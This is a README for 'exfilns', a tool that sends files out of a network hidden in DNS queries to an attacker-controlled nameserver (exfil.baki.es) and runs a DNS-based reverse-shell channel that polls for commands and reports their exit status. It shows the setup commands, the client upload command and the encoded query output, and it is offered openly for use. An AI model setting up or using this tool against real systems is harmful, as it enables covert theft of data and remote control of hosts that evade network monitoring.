# exfilns
Setup: 
have a NS record for the domain you want to use pointed to a server you own

As an example, I run exfil.baki.es pointed to a digital ocean droplet

```
$ dig +short exfil.baki.es NS
ubuntu-nyc1-01.cloud.baki.es.
```

On the server (ubuntu-nyc1-01.cloud.baki.es in the above example) run ns.py with root permissions (to bind to port 53) 

```
$ python3 ns.py --origin exfil.baki.es
Started dns server
```

from any Linux machine you should be able to run the fileupload.sh script to upload a file to that server and given the domain being used

With the examples above an output will look something like this from the client:

```
$ fileupload.sh /path/to/file exfil.baki.es
This file will take 7 dns requests
"Ready"
start-7.gpvkwjwoh6.fu.exfil.baki.es
krugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayj.0.gpvkwjwoh6.fu.exfil.baki.es
aorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4.1.gpvkwjwoh6.fu.exfil.baki.es
zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg.2.gpvkwjwoh6.fu.exfil.baki.es
5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzs.3.gpvkwjwoh6.fu.exfil.baki.es
ayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkru.4.gpvkwjwoh6.fu.exfil.baki.es
gs4zanfzsayjaorsxg5akkrugs4zanfzsayjaorsxg5akkrugs4zanfzsayjaor.5.gpvkwjwoh6.fu.exfil.baki.es
sxg5akkrugs4zanfzsayjaorsxg5ak.6.gpvkwjwoh6.fu.exfil.baki.es
```


And like this from the server output will now have something like this:
```
New file incoming, lines: 7
File: gpvkwjwoh6 14 % complete
File: gpvkwjwoh6 28 % complete
File: gpvkwjwoh6 42 % complete
File: gpvkwjwoh6 57 % complete
File: gpvkwjwoh6 71 % complete
File: gpvkwjwoh6 85 % complete
File: gpvkwjwoh6 100 % complete
File: gpvkwjwoh6 written to disk

```

The file is given a unique handle (above `gpvkwjwoh6`) and is written in the same folder as the python script and is base32 encoded 

There is also some basic reverse shell capabilities by using the revshell script which will check for a new command every 5 seconds

Current implementation only responds with the exit status from the command run 

You can change the command the server sends by typing it in while the dns server is running


When a client reports back to the dns server it reports the host's ID generated by the revshell script and the exit status. 

true and false are inputted here and the host respons with the exit status of true and false 
```
true
host: teo1y exited 0
false
host: teo1y exited 1
```

The client output looks like this:
```
Running true
Request: 0.teo1y.e95p7x5g62.ack.c2.exfil.baki.es
Running false
Request: 1.teo1y.e0z3zxuenu.ack.c2.exfil.baki.es
```


A better dedicated infill module is a WIP
